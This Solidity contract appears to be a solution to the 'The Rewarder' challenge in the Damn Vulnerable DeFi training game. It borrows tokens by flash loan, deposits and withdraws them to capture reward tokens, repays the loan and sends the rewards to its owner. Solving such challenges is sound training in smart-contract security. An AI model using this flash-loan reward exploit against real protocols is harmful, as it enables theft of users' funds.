import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "../DamnValuableToken.sol";


contract AttackRewardPool {
    FlashLoanerPool pool;
    DamnValuableToken public immutable token;
    TheRewarderPool reward;
    address payable owner;

    constructor(
        address _poolAddress,
        address _tokenAddress,
        address _rewardAddress,
        address payable _owner
    ) {
        pool = FlashLoanerPool(_poolAddress);
        token = DamnValuableToken(_tokenAddress);
        reward = TheRewarderPool(_rewardAddress);
        owner = _owner;
    }

    function attack(uint256 amount) external {
        pool.flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) external {
        token.approve(address(reward), amount);
        reward.deposit(amount);
        reward.withdraw(amount);
        token.transfer(address(pool), amount);
        uint256 balance = reward.rewardToken().balanceOf(address(this));
        reward.rewardToken().transfer(owner, balance);
    }
}
